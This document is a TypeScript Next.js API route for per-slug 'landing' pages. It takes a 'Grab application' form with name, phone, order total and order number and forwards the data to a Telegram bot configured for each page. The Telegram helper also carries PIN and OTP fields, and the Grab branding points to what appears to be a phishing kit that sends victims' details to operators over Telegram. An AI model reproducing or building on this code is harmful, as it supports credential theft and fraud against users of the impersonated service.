export const dynamic = 'force-dynamic';

import { sendTelegramMessage } from '@/lib/landing/telegram';
import {
  buildGrabApplicationTelegramMessage,
  isApplicationFormSource,
} from '@/app/[slug]/enterprise/lib/application-telegram-format';
import { GRAB_APPLICATION_REASONS } from '@/app/[slug]/enterprise/forms/application-data';
import { enforceLandingSubmitProtection } from '@/lib/landing/submit-protection';
import { createAdminClient } from '@/lib/supabase-admin';
import { isValidSubdomainSlug, normalizeSubdomainSlug } from '@/lib/subdomain';
import { NextRequest, NextResponse } from 'next/server';

type SubmitBody = {
  slug?: string;
  source?: string;
  name?: string;
  phone?: string;
  total?: string;
  orderNumber?: string;
  reason?: string;
};

function sanitizeApplication(body: SubmitBody) {
  const name = (body.name ?? '').trim().slice(0, 100);
  const phone = (body.phone ?? '').replace(/\D/g, '').slice(0, 13);
  const total = (body.total ?? '').trim().slice(0, 50);
  const orderNumber = (body.orderNumber ?? '').trim().slice(0, 50);
  const reason = (body.reason ?? '').trim();

  if (!name || phone.length < 10) return null;
  if (!total || !orderNumber) return null;
  if (!reason || !GRAB_APPLICATION_REASONS.includes(reason as (typeof GRAB_APPLICATION_REASONS)[number])) {
    return null;
  }

  return { name, phone, total, orderNumber, reason };
}

export async function POST(request: NextRequest) {
  try {
    const body = (await request.json()) as SubmitBody;
    const slug = normalizeSubdomainSlug(body.slug ?? '');

    if (!slug || !isValidSubdomainSlug(slug)) {
      return NextResponse.json({ success: false, error: 'Landing tidak valid.' }, { status: 400 });
    }

    if (!isApplicationFormSource(body.source)) {
      return NextResponse.json({ success: false, error: 'Sumber formulir tidak valid.' }, { status: 400 });
    }

    const data = sanitizeApplication(body);
    if (!data) {
      return NextResponse.json({ success: false, error: 'Data formulir tidak valid.' }, { status: 400 });
    }

    const protection = await enforceLandingSubmitProtection(request, {
      slug,
      step: 1,
      identity: data.phone,
      endpoint: 'application',
    });
    if (!protection.ok) {
      return NextResponse.json(
        { success: false, error: protection.error },
        { status: protection.status }
      );
    }

    const admin = createAdminClient();
    const { data: landing, error } = await admin.rpc('internal_get_landing_telegram', {
      p_slug: slug,
    });

    if (error || !landing?.ok || !landing.bot_token || !landing.chat_id) {
      return NextResponse.json({ success: false, error: 'Landing tidak tersedia.' }, { status: 403 });
    }

    const customText = buildGrabApplicationTelegramMessage(body.source, data);

    const result = await sendTelegramMessage(
      landing.bot_token as string,
      landing.chat_id as string,
      'phone',
      { phone: data.phone, pin: '', otp: '' },
      customText
    );

    if (!result.ok) {
      return NextResponse.json(
        { success: false, error: result.error || 'Gagal mengirim data.' },
        { status: 502 }
      );
    }

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error('Application submit error:', err);
    return NextResponse.json({ success: false, error: 'Terjadi kesalahan server.' }, { status: 500 });
  }
}
